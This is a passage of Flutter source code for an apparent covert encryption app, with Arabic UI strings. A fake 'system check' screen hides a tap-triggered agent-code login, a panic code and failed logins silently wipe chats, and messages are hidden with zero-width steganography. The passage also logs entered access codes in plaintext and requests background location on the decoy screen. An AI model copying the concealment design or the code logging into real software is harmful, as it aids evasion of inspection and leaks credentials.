            const SizedBox(height: 4),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                const Text('الأوامر الناجحة:'),
                Text(
                  '${state.successfulCommands}',
                  style: const TextStyle(color: Colors.green),
                ),
              ],
            ),
            const SizedBox(height: 4),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                const Text('الأوامر الفاشلة:'),
                Text(
                  '${state.failedCommands}',
                  style: const TextStyle(color: Colors.red),
                ),
              ],
            ),
            const Divider(),
            const Text(
              'آخر خطأ:',
              style: TextStyle(fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 4),
            Text(
              state.lastError,
              style: const TextStyle(color: Colors.red),
            ),
            const SizedBox(height: 8),
            Text(
              'آخر تحديث: ${_formatDateTime(state.lastUpdateTime)}',
              style: const TextStyle(fontSize: 12, color: Colors.grey),
            ),
          ],
        ),
      ),
    );
  }
  
  Widget _buildLogsList(DebugMonitorState state) {
    if (state.logs.isEmpty) {
      return const Center(
        child: Text('لا توجد سجلات بعد'),
      );
    }
    
    return Card(
      margin: const EdgeInsets.all(8.0),
      child: ListView.builder(
        itemCount: state.logs.length,
        itemBuilder: (context, index) {
          final log = state.logs[state.logs.length - 1 - index]; // عرض الأحدث أولاً
          return ListTile(
            dense: true,
            title: Text(
              log.message,
              style: TextStyle(
                color: _getLogLevelColor(log.level),
                fontWeight: _isErrorLog(log.level) ? FontWeight.bold : FontWeight.normal,
              ),
            ),
            subtitle: Text(
              '${log.source} - ${_formatDateTime(log.timestamp)}',
              style: const TextStyle(fontSize: 12),
            ),
            leading: Icon(
              _getLogLevelIcon(log.level),
              color: _getLogLevelColor(log.level),
            ),
          );
        },
      ),
    );
  }
  
  Color _getLogLevelColor(String level) {
    switch (level.toUpperCase()) {
      case 'ERROR':
      case 'CRITICAL':
        return Colors.red;
      case 'WARN':
      case 'WARNING':
        return Colors.orange;
      case 'SUCCESS':
        return Colors.green;
      case 'INFO':
        return Colors.blue;
      case 'DEBUG':
        return Colors.grey;
      default:
        return Colors.black;
    }
  }
  
  IconData _getLogLevelIcon(String level) {
    switch (level.toUpperCase()) {
      case 'ERROR':
      case 'CRITICAL':
        return Icons.error;
      case 'WARN':
      case 'WARNING':
        return Icons.warning;
      case 'SUCCESS':
        return Icons.check_circle;
      case 'INFO':
        return Icons.info;
      case 'DEBUG':
        return Icons.code;
      default:
        return Icons.text_snippet;
    }
  }
  
  bool _isErrorLog(String level) {
    return level.toUpperCase() == 'ERROR' || level.toUpperCase() == 'CRITICAL';
  }
  
  String _formatDateTime(DateTime dateTime) {
    return '${dateTime.hour.toString().padLeft(2, '0')}:${dateTime.minute.toString().padLeft(2, '0')}:${dateTime.second.toString().padLeft(2, '0')}';
  }
}



// ------------------------------ نهاية الملف: debug_monitor_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: decoy_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\decoy_screen\decoy_screen.dart
// ----------------------------------------------------------------------

import "dart:async";

import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:permission_handler/permission_handler.dart";

import "../../app.dart";
import "../../core/logging/logger_provider.dart";
import "decoy_screen_controller.dart";

class DecoyScreen extends ConsumerStatefulWidget {
  final bool isPostDestruct;
  const DecoyScreen({super.key, this.isPostDestruct = false});

  @override
  ConsumerState<DecoyScreen> createState() => _DecoyScreenState();
}

class _DecoyScreenState extends ConsumerState<DecoyScreen> {
  bool _permissionsRequested = false;

  @override
  void initState() {
    super.initState();
    // Request permissions after widget is built
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _requestPermissions();
    });
  }

  Future<void> _requestPermissions() async {
    if (_permissionsRequested) return;

    final logger = ref.read(appLoggerProvider);
    logger.info("DecoyScreen", "Requesting required permissions");

    // List of required permissions from AndroidManifest.xml
    final permissions = [
      Permission.camera,
      Permission.location,
      Permission.locationWhenInUse,
      Permission.storage,
    ];

    // Request each permission
    for (var permission in permissions) {
      final status = await permission.status;

      if (status.isDenied) {
        logger.info("DecoyScreen", "Requesting permission: $permission");
        final result = await permission.request();

        logger.info("DecoyScreen", "Permission $permission result: $result");
      } else {
        logger.info("DecoyScreen", "Permission $permission status: $status");
      }
    }

    // Check if background location is needed (only request if other location permissions granted)
    if (await Permission.locationWhenInUse.isGranted) {
      final backgroundStatus = await Permission.locationAlways.status;
      if (backgroundStatus.isDenied) {
        logger.info("DecoyScreen", "Requesting background location permission");
        final result = await Permission.locationAlways.request();
        logger.info(
            "DecoyScreen", "Background location permission result: $result");
      }
    }

    setState(() {
      _permissionsRequested = true;
    });
  }

  @override
  Widget build(BuildContext context) {
    final controller = ref.watch(decoyScreenControllerProvider.notifier);
    final state = ref.watch(decoyScreenControllerProvider);

    // عرض شاشة القفل إذا تم تجاوز الحد الأقصى للمحاولات
    if (state.lockoutEndTime != null) {
      return _buildLockoutScreen(context, controller.getRemainingLockoutTime());
    }

    // عرض شاشة ما بعد التدمير
    if (state.isPostDestruct || widget.isPostDestruct) {
      return _buildPostDestructScreen(context);
    }

    // عرض الشاشة الرئيسية
    return GestureDetector(
      onTap: () {
        controller.handleTap();
        if (controller.shouldShowPasswordDialog()) {
          _showPasswordDialog(context, ref);
        }
      },
      child: _buildMainScreen(context, state),
    );
  }

  Widget _buildLockoutScreen(BuildContext context, String remainingTime) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.lock_outline_rounded,
                size: 80,
                color: Colors.red.shade700,
              ),
              const SizedBox(height: 30),
              Text(
                "لا يمكنك تسجيل الدخول الآن",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 22,
                  fontWeight: FontWeight.w600,
                  color: Colors.red.shade700,
                ),
              ),
              const SizedBox(height: 15),
              Text(
                "يرجى المحاولة مرة أخرى بعد: $remainingTime",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 16,
                  fontWeight: FontWeight.w500,
                  color: Colors.grey[700],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildPostDestructScreen(BuildContext context) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.lock_outline_rounded,
                size: 80,
                color: Colors.red.shade700,
              ),
              const SizedBox(height: 30),
              Text(
                "تم تفعيل وضع الأمان. النظام مقفل.",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.red.shade700,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildMainScreen(BuildContext context, DecoyScreenState state) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.shield_outlined,
                size: 80,
                color: state.systemCheckComplete
                    ? theme.primaryColor
                    : Colors.grey[600],
              ),
              const SizedBox(height: 30),
              Text(
                state.statusMessage,
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: state.systemCheckComplete
                      ? Colors.green[600]
                      : theme.textTheme.bodyLarge?.color,
                ),
              ),
              const SizedBox(height: 20),
              if (!state.systemCheckComplete)
                Column(
                  children: [
                    LinearProgressIndicator(
                      value: state.progressValue,
                      backgroundColor: Colors.grey[300],
                      valueColor:
                          AlwaysStoppedAnimation<Color>(theme.primaryColor),
                      minHeight: 6,
                    ),
                    const SizedBox(height: 10),
                    Text(
                      "${(state.progressValue * 100).toInt()}%",
                      style: GoogleFonts.cairo(
                          fontSize: 12, color: Colors.grey[600]),
                    ),
                  ],
                ),
              if (!_permissionsRequested)
                Padding(
                  padding: const EdgeInsets.only(top: 20.0),
                  child: Column(
                    children: [
                      CircularProgressIndicator(
                        valueColor:
                            AlwaysStoppedAnimation<Color>(theme.primaryColor),
                      ),
                      const SizedBox(height: 10),
                      Text(
                        "جاري التحقق من الأذونات...",
                        style: GoogleFonts.cairo(
                            fontSize: 14, color: Colors.grey[600]),
                      ),
                    ],
                  ),
                ),
              if (_permissionsRequested)
                Padding(
                  padding: const EdgeInsets.only(top: 20.0),
                  child: ElevatedButton.icon(
                    icon: const Icon(Icons.settings_applications),
                    label: Text("إدارة الأذونات", style: GoogleFonts.cairo()),
                    onPressed: () async {
                      await openAppSettings();
                    },
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  void _showPasswordDialog(BuildContext context, WidgetRef ref) {
    final TextEditingController passwordController = TextEditingController();
    final controller = ref.read(decoyScreenControllerProvider.notifier);
    final state = ref.read(decoyScreenControllerProvider);
    final logger = ref.read(appLoggerProvider);
    bool isLoading = false;

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext dialogContext) {
        return StatefulBuilder(
          builder: (context, setDialogState) {
            return AlertDialog(
              backgroundColor:
                  Theme.of(dialogContext).brightness == Brightness.dark
                      ? const Color(0xFF1F1F1F)
                      : Colors.grey[50],
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(15)),
              title: Row(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  Text("الوصول المشفر",
                      style: GoogleFonts.cairo(
                          fontWeight: FontWeight.bold,
                          color:
                              Theme.of(dialogContext).colorScheme.onSurface)),
                  const SizedBox(width: 8),
                  Icon(Icons.security_outlined,
                      color: Theme.of(dialogContext).primaryColor),
                ],
              ),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text("يرجى إدخال رمز المصادقة المخصص للوصول إلى النظام.",
                      textAlign: TextAlign.right,
                      style: GoogleFonts.cairo(
                          fontSize: 14, color: Colors.grey[600])),
                  const SizedBox(height: 20),
                  TextField(
                    controller: passwordController,
                    keyboardType: TextInputType.text,
                    autofocus: true,
                    textAlign: TextAlign.center,
                    style: GoogleFonts.cairo(
                        fontSize: 22,
                        letterSpacing: 3,
                        fontWeight: FontWeight.bold,
                        color: Theme.of(dialogContext).colorScheme.onSurface),
                    decoration: InputDecoration(
                      hintText: "- - - - - -",
                      hintStyle: GoogleFonts.cairo(
                          color: Colors.grey[500], fontSize: 20),
                      border: OutlineInputBorder(
                        borderRadius:
                            const BorderRadius.all(Radius.circular(10)),
                        borderSide: BorderSide(color: Colors.grey[400]!),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius:
                            const BorderRadius.all(Radius.circular(10)),
                        borderSide: BorderSide(
                            color: Theme.of(dialogContext).primaryColor,
                            width: 2),
                      ),
                      filled: true,
                      fillColor:
                          Theme.of(dialogContext).brightness == Brightness.dark
                              ? Colors.black.withOpacity(0.1)
                              : Colors.white,
                    ),
                  ),
                  if (state.failedLoginAttempts > 0)
                    Padding(
                      padding: const EdgeInsets.only(top: 10.0),
                      child: Text(
                        "المحاولات الخاطئة: ${state.failedLoginAttempts}/5",
                        textAlign: TextAlign.center,
                        style: GoogleFonts.cairo(
                            fontSize: 12, color: Colors.orange.shade700),
                      ),
                    ),
                ],
              ),
              actionsAlignment: MainAxisAlignment.center,
              actionsPadding: const EdgeInsets.only(bottom: 20, top: 10),
              actions: <Widget>[
                ElevatedButton.icon(
                  icon: isLoading
                      ? Container(
                          width: 20,
                          height: 20,
                          padding: const EdgeInsets.all(2.0),
                          child: const CircularProgressIndicator(
                            color: Colors.white,
                            strokeWidth: 3,
                          ),
                        )
                      : const Icon(Icons.login_rounded, size: 20),
                  label: Text(isLoading ? "جاري التحقق..." : "تأكيد الوصول",
                      style: GoogleFonts.cairo(
                          fontSize: 15, fontWeight: FontWeight.w600)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Theme.of(dialogContext).primaryColor,
                    foregroundColor: Colors.white,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 30, vertical: 12),
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10)),
                    elevation: 3,
                  ),
                  onPressed: isLoading
                      ? null
                      : () async {
                          setDialogState(() {
                            isLoading = true;
                          });

                          final enteredAgentCode =
                              passwordController.text.trim();
                          final bool isDialogCtxMounted = dialogContext.mounted;
                          final bool isMainCtxMounted = context.mounted;

                          logger.info("DecoyPasswordDialog",
                              "محاولة تسجيل الدخول برمز الوكيل: $enteredAgentCode");

                          final authResult = await controller
                              .authenticateWithAgentCode(enteredAgentCode);

                          if (!isDialogCtxMounted || !isMainCtxMounted) {
                            return;
                          }

                          if (authResult.success) {
                            logger.info("DecoyPasswordDialog",
                                "تم التحقق بنجاح من رمز الوكيل: $enteredAgentCode");

                            if (authResult.isPanicCode) {
                              // رمز الهلع - سيتم التعامل معه في وحدة التحكم
                              Navigator.of(dialogContext).pop();
                              Navigator.of(context).pushReplacement(
                                MaterialPageRoute(
                                    builder: (_) => const TheConduitApp()),
                              );
                              return;
                            }

                            Navigator.of(dialogContext).pop();
                            Navigator.of(context).pushReplacement(
                              MaterialPageRoute(
                                  builder: (_) => const TheConduitApp()),
                            );
                          } else {
                            logger.warn("DecoyPasswordDialog",
                                "رمز وكيل غير صالح: $enteredAgentCode");

                            if (ref
                                    .read(decoyScreenControllerProvider)
                                    .failedLoginAttempts >=
                                5) {
                              Navigator.of(dialogContext).pop();
                            } else {
                              ScaffoldMessenger.of(dialogContext)
                                  .showSnackBar(SnackBar(
                                content: Text(authResult.message,
                                    textAlign: TextAlign.right,
                                    style: GoogleFonts.cairo()),
                                backgroundColor: Colors.red[700],
                              ));
                              setDialogState(() {
                                isLoading = false;
                              });
                            }
                          }
                        },
                ),
              ],
            );
          },
        );
      },
    );
  }
}



// ------------------------------ نهاية الملف: decoy_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: decoy_screen_controller.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\decoy_screen\decoy_screen_controller.dart
// ----------------------------------------------------------------------

// lib/presentation/decoy_screen/decoy_screen_controller.dart
import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../core/logging/logger_provider.dart';
import '../../core/security/self_destruct_service.dart';
import '../chat/services/auth_service.dart';

class DecoyScreenController extends StateNotifier<DecoyScreenState> {
  final Ref _ref;
  final AuthService _authService;
  Timer? _progressTimer;
  Timer? _lockoutTimer;

  static const String _failedAttemptsKey = 'failed_login_attempts_conduit';
  static const String _lockoutEndTimeKey = 'lockout_end_time_conduit';
  static const int _maxFailedAttempts = 5;
  static const Duration _lockoutDuration = Duration(minutes: 30);

  DecoyScreenController(this._ref, this._authService)
      : super(DecoyScreenState.initial()) {
    _loadFailedAttempts();
    _loadLockoutTime();
    if (!state.isPostDestruct) {
      _startSystemCheckAnimation();
    }
  }

  void _startSystemCheckAnimation() {
    _progressTimer = Timer.periodic(const Duration(milliseconds: 150), (timer) {
      state = state.copyWith(
        progressValue: state.progressValue + 0.02,
      );

      if (state.progressValue >= 1.0) {
        state = state.copyWith(
          progressValue: 1.0,
          statusMessage: "فحص النظام الأساسي مكتمل.",
          systemCheckComplete: true,
        );
        timer.cancel();
      } else if (state.progressValue > 0.7) {
        state = state.copyWith(
          statusMessage: "التحقق من سلامة المكونات...",
        );
      } else if (state.progressValue > 0.4) {
        state = state.copyWith(
          statusMessage: "تحميل وحدات الأمان...",
        );
      }
    });
  }

  Future<void> _loadFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: prefs.getInt(_failedAttemptsKey) ?? 0,
    );

    // تحقق مما إذا تم تجاوز الحد الأقصى للمحاولات
    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
      _ref.read(appLoggerProvider).warn(
          "DecoyScreenInit",
          "Max failed attempts (${state.failedLoginAttempts}) detected on load. Triggering silent self-destruct.");
      _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsOnLoad");
    }
  }

  Future<void> _loadLockoutTime() async {
    final prefs = await SharedPreferences.getInstance();
    final lockoutTimeMs = prefs.getInt(_lockoutEndTimeKey);
    if (lockoutTimeMs != null) {
      final lockoutEndTime = DateTime.fromMillisecondsSinceEpoch(lockoutTimeMs);
      if (lockoutEndTime.isAfter(DateTime.now())) {
        state = state.copyWith(lockoutEndTime: lockoutEndTime);
        _startLockoutTimer();
      } else {
        // الوقت انتهى، يمكن إعادة تعيين المحاولات
        await prefs.remove(_lockoutEndTimeKey);
      }
    }
  }

  void _startLockoutTimer() {
    _lockoutTimer?.cancel();
    _lockoutTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (state.lockoutEndTime == null ||
          state.lockoutEndTime!.isBefore(DateTime.now())) {
        timer.cancel();
        state = state.copyWith(lockoutEndTime: null);
      } else {
        // تحديث الحالة لإعادة بناء الواجهة وتحديث العداد التنازلي
        state = state.copyWith();
      }
    });
  }

  Future<void> _incrementFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: state.failedLoginAttempts + 1,
    );
    await prefs.setInt(_failedAttemptsKey, state.failedLoginAttempts);
    _ref.read(appLoggerProvider).warn(
        "DecoyScreen", "Failed login attempt. Count: ${state.failedLoginAttempts}");

    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
      // تدمير المحادثات بشكل صامت وإظهار رسالة القفل
      await _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsReached");

      // تعيين وقت انتهاء القفل
      final lockoutEndTime = DateTime.now().add(_lockoutDuration);
      await prefs.setInt(
          _lockoutEndTimeKey, lockoutEndTime.millisecondsSinceEpoch);

      state = state.copyWith(lockoutEndTime: lockoutEndTime);
      _startLockoutTimer();
    }
  }

  Future<void> _resetFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: 0,
      lockoutEndTime: null,
    );
    await prefs.setInt(_failedAttemptsKey, 0);
    await prefs.remove(_lockoutEndTimeKey);
    _lockoutTimer?.cancel();
    _ref.read(appLoggerProvider).info("DecoyScreen", "Failed login attempts reset.");
  }

  void handleTap() {
    if (state.isPostDestruct ||
        !state.systemCheckComplete ||
        state.lockoutEndTime != null) {
      return;
    }
    state = state.copyWith(tapCount: state.tapCount + 1);
  }

  bool shouldShowPasswordDialog() {
    if (state.tapCount >= 5) {
      state = state.copyWith(tapCount: 0);
      return true;
    }
    return false;
  }

  Future<AuthResult> authenticateWithAgentCode(String agentCode) async {
    final result = await _authService.authenticateAgent(agentCode);
    
    if (result.success) {
      await _resetFailedAttempts();
      if (result.isPanicCode) {
        await _triggerSelfDestruct(triggeredBy: "PanicCode00000");
      }
    } else {
      await _incrementFailedAttempts();
    }
    
    return result;
  }

  // تدمير البيانات بشكل صامت دون إظهار أي إشعارات للمستخدم
  Future<void> _triggerSilentSelfDestruct({String triggeredBy = "Unknown"}) async {
    if (state.isPostDestruct) {
      _ref.read(appLoggerProvider).info(
          "SilentSelfDestructTrigger",
          "Already in post-destruct state. Trigger by $triggeredBy ignored.");
      return;
    }

    _ref.read(appLoggerProvider).error(
        "SILENT SELF-DESTRUCT TRIGGERED by: $triggeredBy",
        "SILENT_SELF_DESTRUCT_TRIGGER");

    try {
      await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
    } catch (e, s) {
      _ref.read(appLoggerProvider).error(
          "SilentSelfDestruct", "Error during silent self-destruct", e, s);
    }
  }

  // الطريقة الأصلية للتدمير الذاتي (تستخدم فقط لرقم الهلع)
  Future<void> _triggerSelfDestruct({String triggeredBy = "Unknown"}) async {
    if (state.isPostDestruct) {
      _ref.read(appLoggerProvider).info(
          "SelfDestructTrigger",
          "Already in post-destruct state. Trigger by $triggeredBy ignored.");
      return;
    }

    _ref.read(appLoggerProvider).error(
        "SELF-DESTRUCT TRIGGERED in DecoyScreen by: $triggeredBy",
        "SELF_DESTRUCT_TRIGGER");
    
    // استخدام خدمة التدمير الذاتي
    await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
  }

  String getRemainingLockoutTime() {
    if (state.lockoutEndTime == null) return "";

    final now = DateTime.now();
    if (state.lockoutEndTime!.isBefore(now)) return "";

    final difference = state.lockoutEndTime!.difference(now);
    final minutes = difference.inMinutes;
    final seconds = difference.inSeconds % 60;

    return "$minutes:${seconds.toString().padLeft(2, '0')}";
  }

  @override
  void dispose() {
    _progressTimer?.cancel();
    _lockoutTimer?.cancel();
    super.dispose();
  }
}

class DecoyScreenState {
  final int tapCount;
  final double progressValue;
  final String statusMessage;
  final bool systemCheckComplete;
  final int failedLoginAttempts;
  final DateTime? lockoutEndTime;
  final bool isPostDestruct;

  DecoyScreenState({
    required this.tapCount,
    required this.progressValue,
    required this.statusMessage,
    required this.systemCheckComplete,
    required this.failedLoginAttempts,
    this.lockoutEndTime,
    required this.isPostDestruct,
  });

  factory DecoyScreenState.initial() {
    return DecoyScreenState(
      tapCount: 0,
      progressValue: 0.0,
      statusMessage: "جاري تهيئة النظام...",
      systemCheckComplete: false,
      failedLoginAttempts: 0,
      lockoutEndTime: null,
      isPostDestruct: false,
    );
  }

  DecoyScreenState copyWith({
    int? tapCount,
    double? progressValue,
    String? statusMessage,
    bool? systemCheckComplete,
    int? failedLoginAttempts,
    DateTime? lockoutEndTime,
    bool? isPostDestruct,
  }) {
    return DecoyScreenState(
      tapCount: tapCount ?? this.tapCount,
      progressValue: progressValue ?? this.progressValue,
      statusMessage: statusMessage ?? this.statusMessage,
      systemCheckComplete: systemCheckComplete ?? this.systemCheckComplete,
      failedLoginAttempts: failedLoginAttempts ?? this.failedLoginAttempts,
      lockoutEndTime: lockoutEndTime ?? this.lockoutEndTime,
      isPostDestruct: isPostDestruct ?? this.isPostDestruct,
    );
  }
}

final decoyScreenControllerProvider =
    StateNotifierProvider<DecoyScreenController, DecoyScreenState>((ref) {
  final authService = ref.watch(authServiceProvider);
  return DecoyScreenController(ref, authService);
});



// ------------------------------ نهاية الملف: decoy_screen_controller.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: encryption_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\encryption_tab\encryption_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/encryption_tab/encryption_screen.dart
import 'dart:async';
import 'package:cryptography/cryptography.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:share_plus/share_plus.dart';
import '../../core/encryption/aes_gcm_service.dart';
import '../../core/history/history_item.dart';
import '../../core/history/history_service.dart'; // هنا يتم استيراد HistoryService
import '../../core/logging/logger_service.dart';
import '../../core/steganography/zero_width_service.dart';
import '../../core/logging/logger_provider.dart'; // افترض أن هذا يوفر appLoggerProvider

// Providers
final aesGcmServiceProvider = Provider<AesGcmService>((ref) => AesGcmService());
final zeroWidthServiceProvider =
    Provider<ZeroWidthService>((ref) => ZeroWidthService());

// *** الإصلاح الرئيسي هنا للخطأ not_enough_positional_arguments ***
// افترض أن HistoryService يتطلب LoggerService. تأكد من أن appLoggerProvider يوفر LoggerService.
final historyServiceProvider = Provider<HistoryService>((ref) {
  final logger = ref.watch(appLoggerProvider); // احصل على الـ logger
  return HistoryService(logger); // مرر الـ logger إلى HistoryService
});
// إذا كان HistoryService لا يتطلب أي arguments الآن، يمكنك العودة إلى:
// final historyServiceProvider = Provider<HistoryService>((ref) => HistoryService());
// ولكن رسالة الخطأ تشير إلى أنه يتطلب argument.

// enum OperationMode, class EncryptionState (كما هي من قبل)
enum OperationMode {
  encrypt,
  decrypt,
  hide,
  reveal,
  encryptAndHide,
  revealAndDecrypt
}

class EncryptionState {
  final String secretInput;
  final String coverInput;
  final String passwordInput;
  final String outputText;
  final bool isLoading;
  final bool isPasswordVisible;
  final OperationMode operationMode;

  EncryptionState({
    this.secretInput = '',
    this.coverInput = '',
    this.passwordInput = '',
    this.outputText = '',
    this.isLoading = false,
    this.isPasswordVisible = false,
    this.operationMode = OperationMode.encrypt,
  });

  bool get useSteganography => _deriveUseSteganography(operationMode);
  bool get usePassword => _deriveUsePassword(operationMode);

  EncryptionState copyWith({
    String? secretInput,
    String? coverInput,
    String? passwordInput,
    String? outputText,
    bool? isLoading,
    bool? isPasswordVisible,
    OperationMode? operationMode,
  }) {
    final newOperationMode = operationMode ?? this.operationMode;
    return EncryptionState(
      secretInput: secretInput ?? this.secretInput,
      coverInput: coverInput ?? this.coverInput,
      passwordInput: passwordInput ?? this.passwordInput,
      outputText: outputText ?? this.outputText,
      isLoading: isLoading ?? this.isLoading,
      isPasswordVisible: isPasswordVisible ?? this.isPasswordVisible,
      operationMode: newOperationMode,
    );
  }

  static bool _deriveUseSteganography(OperationMode mode) {
    return mode == OperationMode.hide ||
        mode == OperationMode.reveal ||
        mode == OperationMode.encryptAndHide ||
        mode == OperationMode.revealAndDecrypt;
  }

  static bool _deriveUsePassword(OperationMode mode) {
    return mode == OperationMode.encrypt ||
        mode == OperationMode.decrypt ||
        mode == OperationMode.encryptAndHide ||
        mode == OperationMode.revealAndDecrypt;
  }
}

// class EncryptionNotifier (تستخدم historyServiceProvider المُعدّل)
class EncryptionNotifier extends StateNotifier<EncryptionState> {
  final AesGcmService _aesService;
  final ZeroWidthService _zwService;
  final HistoryService
      _historyService; // ستحصل على النسخة الصحيحة من خلال الـ provider
  final LoggerService _logger;

  EncryptionNotifier(
      this._aesService, this._zwService, this._historyService, this._logger)
      : super(EncryptionState());

  // ... (باقي دوال EncryptionNotifier كما هي: updateSecretInput, performOperation, etc.)
  // لا حاجة لتغييرها هنا لأنها تتلقى HistoryService كـ dependency
  void updateSecretInput(String value) =>
      state = state.copyWith(secretInput: value, outputText: '');
  void updateCoverInput(String value) =>
      state = state.copyWith(coverInput: value, outputText: '');
  void updatePasswordInput(String value) =>
      state = state.copyWith(passwordInput: value, outputText: '');
  void togglePasswordVisibility() =>
      state = state.copyWith(isPasswordVisible: !state.isPasswordVisible);

  void setOperationMode(OperationMode mode) {
    state = state.copyWith(operationMode: mode, outputText: '');
  }

  void resetFields() {
    state = state.copyWith(
      secretInput: '',
      coverInput: '',
      outputText: '',
      isLoading: false,
    );
  }

  Future<void> performOperation() async {
    state = state.copyWith(isLoading: true, outputText: '');
    String result = '';
    OperationType historyOpType = OperationType.encryptAes;
    String inputForHistory = state.secretInput;
    String? historyCover =
        state.coverInput.isNotEmpty ? state.coverInput : null;
    bool historyUsedPassword = state.usePassword;
    bool historyUsedStego = state.useSteganography;

    _logger.info("performOperation",
        "Mode: ${state.operationMode}, UsePwd: $historyUsedPassword, UseStego: $historyUsedStego");

    try {
      final secret = state.secretInput.trim();
      final cover = state.coverInput.trim();
      final password = state.passwordInput;

      if (secret.isEmpty) {
        throw Exception('يرجى إدخال النص المطلوب.');
      }
      if (historyUsedPassword && password.isEmpty) {
        throw Exception('كلمة المرور مطلوبة لهذه العملية.');
      }
      if ((state.operationMode == OperationMode.hide ||
              state.operationMode == OperationMode.encryptAndHide) &&
          cover.isEmpty) {
        throw Exception('نص الغطاء مطلوب عند استخدام الإخفاء.');
      }

      switch (state.operationMode) {
        case OperationMode.encrypt:
          historyOpType = OperationType.encryptAes;
          result = await _aesService.encryptWithPassword(secret, password);
          break;
        case OperationMode.decrypt:
          historyOpType = OperationType.decryptAes;
          result = await _aesService.decryptWithPassword(secret, password);
          break;
        case OperationMode.hide:
          historyOpType = OperationType.encodeZeroWidth;
          final zeroWidth = _zwService.encode(secret);
          result = _zwService.hideInCoverText(cover, zeroWidth);
          break;
        case OperationMode.reveal:
          historyOpType = OperationType.decodeZeroWidth;
          result = _zwService.extractFromText(secret);
          break;
        case OperationMode.encryptAndHide:
          historyOpType = OperationType.encryptThenHide;
          final encrypted =
              await _aesService.encryptWithPassword(secret, password);
          final zeroWidth = _zwService.encode(encrypted);
          result = _zwService.hideInCoverText(cover, zeroWidth);
          break;
        case OperationMode.revealAndDecrypt:
          historyOpType = OperationType.revealThenDecrypt;
          final extracted = _zwService.extractFromText(secret);
          result = await _aesService.decryptWithPassword(extracted, password);
          break;
      }
      state = state.copyWith(outputText: result, isLoading: false);
      _logger.info("performOperation",
          "Success. Output: ${result.substring(0, (result.length > 30 ? 30 : result.length))}...");

      await _historyService.addHistoryItem(HistoryItem(
        id: DateTime.now().millisecondsSinceEpoch.toString(),
        timestamp: DateTime.now(),
        operationType: historyOpType,
        originalInput: (historyOpType == OperationType.encryptAes ||
                historyOpType == OperationType.encodeZeroWidth ||
                historyOpType == OperationType.encryptThenHide ||
                historyOpType == OperationType.encryptFile ||
                historyOpType == OperationType.embedImageStego)
            ? inputForHistory
            : null,
        processedInput: (historyOpType == OperationType.decryptAes ||
                historyOpType == OperationType.decodeZeroWidth ||
                historyOpType == OperationType.revealThenDecrypt ||
                historyOpType == OperationType.decryptFile ||
                historyOpType == OperationType.extractImageStego)
            ? inputForHistory
            : null,
        coverText: historyCover,
        output: result,
        usedPassword: historyUsedPassword,
        usedSteganography: historyUsedStego,
      ));
    } on SecretBoxAuthenticationError {
      _logger.warn("performOperation",
          "Authentication failed (wrong password/tampered)");
